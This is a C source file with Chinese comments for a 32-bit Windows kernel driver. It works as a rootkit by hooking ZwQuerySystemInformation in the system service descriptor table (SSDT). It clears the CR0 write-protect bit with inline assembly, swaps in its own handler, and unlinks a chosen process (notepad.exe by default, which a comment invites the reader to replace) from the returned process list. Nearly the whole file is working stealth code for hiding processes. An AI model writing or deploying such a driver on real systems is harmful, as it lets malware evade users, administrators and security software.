﻿#include<ntddk.h>  
  
#ifdef __cplusplus
extern "C"
{
#endif

typedef struct ServiceDescriptorEntry  {  
    unsigned int *ServiceTableBase;          //指向系统服务程序的地址(SSDT)  
    unsigned int *ServiceCounterTableBase;   //指向另一个索引表，该表包含了每个服务表项被调用的次数；不过这个值只在Checkd Build的内核中有效，在Free Build的内核中，这个值总为NULL  
    unsigned int NumberOfServices;           //表示当前系统所支持的服务个数  
    unsigned char *ParamTableBase;           //指向SSPT中的参数地址，它们都包含了NumberOfService这么多个数组单元  
} ServiceDescriptorTableEntry , *PServiceDescriptorTableEntry;  
  
extern PServiceDescriptorTableEntry KeServiceDescriptorTable;//KeServiceDescriptorTable为导出函数  
  
struct _SYSTEM_THREADS   
{   
    LARGE_INTEGER KernelTime;   
    LARGE_INTEGER UserTime;   
    LARGE_INTEGER CreateTime;   
    ULONG WaitTime;   
    PVOID StartAddress;   
    CLIENT_ID ClientIs;   
    KPRIORITY Priority;   
    KPRIORITY BasePriority;   
    ULONG ContextSwitchCount;   
    ULONG ThreadState;   
    KWAIT_REASON WaitReason;   
};   
  
typedef struct _SYSTEM_PROCESSES   
{   
    ULONG NextEntryDelta;                 //下一个进程信息的偏移量,如果为0表示无一个进程信息  
    ULONG ThreadCount;                    //线程数  
    ULONG Reserved[6];   
    LARGE_INTEGER CreateTime;             //创建进程的时间  
    LARGE_INTEGER UserTime;               //进程中所有线程在用户模式运行时间的总和  
    LARGE_INTEGER KernelTime;             //进程中所有线程在内核模式运行时间的总和  
    UNICODE_STRING ProcessName;           //进程的名字  
    KPRIORITY BasePriority;               //线程的缺省优先级  
    ULONG ProcessId;                      //进程ID号  
    ULONG InheritedFromProcessId;         //继承语柄的进程ID号  
    ULONG HandleCount;                    //进程打开的语柄数量  
    ULONG Reserved2[2];   
    VM_COUNTERS VmCounters;               //虚拟内存的使用情况统计  
    IO_COUNTERS IoCounters;               //IO操作的统计,Only For 2000  
    struct _SYSTEM_THREADS Threads[1];    //描述进程中各线程的数组  
}SystemProcessInformation, *PSystemProcessInformation;   
  
NTSYSAPI NTSTATUS NTAPI ZwQuerySystemInformation(   
                                                 IN ULONG SystemInformationClass,      //查询系统服务类型  
                                                 IN PVOID SystemInformation,           //接收系统信息缓冲区  
                                                 IN ULONG SystemInformationLength,     //接收信息缓冲区大小  
                                                 OUT PULONG ReturnLength);             //实际接收到的大小  
  
  
typedef NTSTATUS (*ZWQUERYSYSTEMINFORMATION)(  
                                             IN ULONG SystemInformationClass,   
                                             IN PVOID SystemInformation,   
                                             IN ULONG SystemInformationLength,   
                                             OUT PULONG ReturnLength);  
  
NTSTATUS MyZwQuerySystemInformation(   
                                    IN ULONG SystemInformationClass,   
                                    IN PVOID SystemInformation,   
                                    IN ULONG SystemInformationLength,   
                                    OUT PULONG ReturnLength);  

}

/////////////////////////////////////  
VOID Hook();  
VOID Unhook();  
VOID OnUnload(IN PDRIVER_OBJECT DriverObject);  
//////////////////////////////////////  
ULONG ZwQuerySystemInformationIndex = 0;  
ULONG gOrigZwQuerySystemInformation = 0;  
//////////////////////////////////////  
NTSTATUS MyZwQuerySystemInformation(   
    IN ULONG SystemInformationClass,   
    IN PVOID SystemInformation,   
    IN ULONG SystemInformationLength,   
    OUT PULONG ReturnLength)  
{  
    NTSTATUS Status = STATUS_SUCCESS;  
    PVOID pBuff = NULL;  
    ULONG uLen = 0;  
      
    UNICODE_STRING process_name;  
      
    Status = ((ZWQUERYSYSTEMINFORMATION)gOrigZwQuerySystemInformation)( SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength );  
      
    if( NT_SUCCESS(Status) )  
    {  
        if( SystemInformationClass == 5 )  
        {  
            PSystemProcessInformation pCur = NULL;  
            PSystemProcessInformation pPre = NULL;  
            pCur = (PSystemProcessInformation)SystemInformation;  
  
            RtlInitUnicodeString(&process_name, L"notepad.exe");//改成自己要隐藏的进程名  
              
            while( pCur != NULL )  
            {  
                if( RtlCompareUnicodeString(&process_name, &pCur->ProcessName, TRUE) == 0)//隐藏进程  
                {  
                    DbgPrint("ProcessName: %wZ", &pCur->ProcessName);  
					KdPrint(("ProcessId : %d", pCur->ProcessId));
                    if( pPre == NULL )  
                    {//隐藏的进程是第一个信息  
                        if( pCur->NextEntryDelta == 0 )  
                        {//隐藏的进程是唯一信息  
                            memset( SystemInformation, 0, sizeof( SystemProcessInformation ) );  
                            break;  
                        }  
                        else  
                        {//修改的地方，  
                            ULONG len = sizeof( SystemProcessInformation );  
                            ULONG uOffet = ((PSystemProcessInformation)SystemInformation)->NextEntryDelta;  
                            pCur = (PSystemProcessInformation)((ULONG)pCur + pCur->NextEntryDelta);  
                            memcpy( SystemInformation, pCur, len );  
                            ((PSystemProcessInformation)SystemInformation)->NextEntryDelta += uOffet;  
                              
                        }  
                    }  
                    else  
                    {//隐藏的信息不是第一个进程  
                        if( pCur->NextEntryDelta == 0 )  
                        {  
                            pPre->NextEntryDelta = 0;  
                            break;  
                        }  
                        else  
                        {  
                            pPre->NextEntryDelta = pPre->NextEntryDelta + pCur->NextEntryDelta;  
                            pCur = (PSystemProcessInformation)((ULONG)pCur + pCur->NextEntryDelta);  
                        }  
                          
                    }  
                }  
                else  
                {  
                    pPre = pCur;  
                    if( pCur->NextEntryDelta == 0 )  
                        break;  
                    pCur = (PSystemProcessInformation)((ULONG)pCur + pCur->NextEntryDelta);  
                }  
            }  
        }  
    }  
    return Status;  
}  
///////////////////////////////////////////////////  
NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject,PUNICODE_STRING RegistryPath)  
{  
    DriverObject->DriverUnload = OnUnload;  
    DbgPrint("Unhooker load");  
    Hook();  
    return STATUS_SUCCESS;  
}  
/////////////////////////////////////////////////////  
VOID OnUnload(IN PDRIVER_OBJECT DriverObject)  
{  
    DbgPrint("Unhooker unload!");  
    Unhook();  
}  
/////////////////////////////////////////////////////  
VOID Hook()  
{  
    ZwQuerySystemInformationIndex = *(PULONG)((ULONG)ZwQuerySystemInformation+1);  
    gOrigZwQuerySystemInformation = KeServiceDescriptorTable->ServiceTableBase[ZwQuerySystemInformationIndex];  
    __asm{//去掉内存保护  
        cli  
        mov eax,cr0  
        and eax,not 10000h  
        mov cr0,eax  
    }  
    KeServiceDescriptorTable->ServiceTableBase[ZwQuerySystemInformationIndex] = (ULONG)MyZwQuerySystemInformation;  
    __asm{//恢复内存保护   
        mov eax,cr0  
        or eax,10000h  
        mov cr0,eax  
        sti  
    }  
}  
//////////////////////////////////////////////////////  
VOID Unhook()  
{  
    __asm{  
        cli  
        mov eax,cr0  
        and eax,not 10000h  
        mov cr0,eax  
    }  
    KeServiceDescriptorTable->ServiceTableBase[ZwQuerySystemInformationIndex] = gOrigZwQuerySystemInformation;  
    __asm{   
        mov eax,cr0  
        or eax,10000h  
        mov cr0,eax  
        sti  
    }  
    DbgPrint("Unhook");
}  
